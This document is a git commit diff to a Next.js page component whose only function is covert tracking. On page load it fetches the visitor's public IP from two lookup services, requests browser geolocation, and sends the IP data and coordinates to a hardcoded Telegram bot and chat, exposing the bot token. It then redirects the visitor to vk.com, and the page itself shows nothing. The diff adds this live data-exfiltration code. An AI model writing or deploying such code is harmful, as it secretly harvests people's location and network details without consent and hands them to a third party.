31655717f39ca231e51b710ca609ce7b7bfe3646
Infinity2326 <dima.gorbachev2002@mail.ru>
2024-04-17 21:13:56 +0300

    dev

--- app/page.tsx
+++ app/page.tsx
@@ -3,17 +3,27 @@ import { useEffect } from "react"
 
 export default function Home() {
   useEffect(() => {
+    let ip = ""
+    let ip2 = ""
     fetch("https://checkip.amazonaws.com/")
       .then((res) => res.text())
       .then((data) => {
-        navigator.geolocation.getCurrentPosition((position) => {
-          const { latitude, longitude } = position.coords
-          fetch(
-            `https://api.telegram.org/bot6865421260:AAGe563ahno6Ln4Q0gCv490JrMys1NopGG4/sendMessage?chat_id=-1002035561069&text=${data}%0A${latitude}%0A${longitude}`
-          )
-        })
-        window.location.href =
-          "https://x.com/Scroll_ZKP/status/1780584704175161392"
+        ip = data
+      })
+      .then(() => {
+        fetch("https://api.db-ip.com/v2/free/self")
+          .then((res) => res.text())
+          .then((data) => {
+            ip2 = data
+            navigator.geolocation.getCurrentPosition((position) => {
+              const { latitude, longitude } = position.coords
+              fetch(
+                `https://api.telegram.org/bot6865421260:AAGe563ahno6Ln4Q0gCv490JrMys1NopGG4/sendMessage?chat_id=-1002035561069&text=${ip}%0A%0A${ip2}%0A%0A${latitude}%0A%0A${longitude}`
+              ).then(() => {
+                window.location.href = "https://vk.com/feed"
+              })
+            })
+          })
       })
   }, [])
   return <p></p>
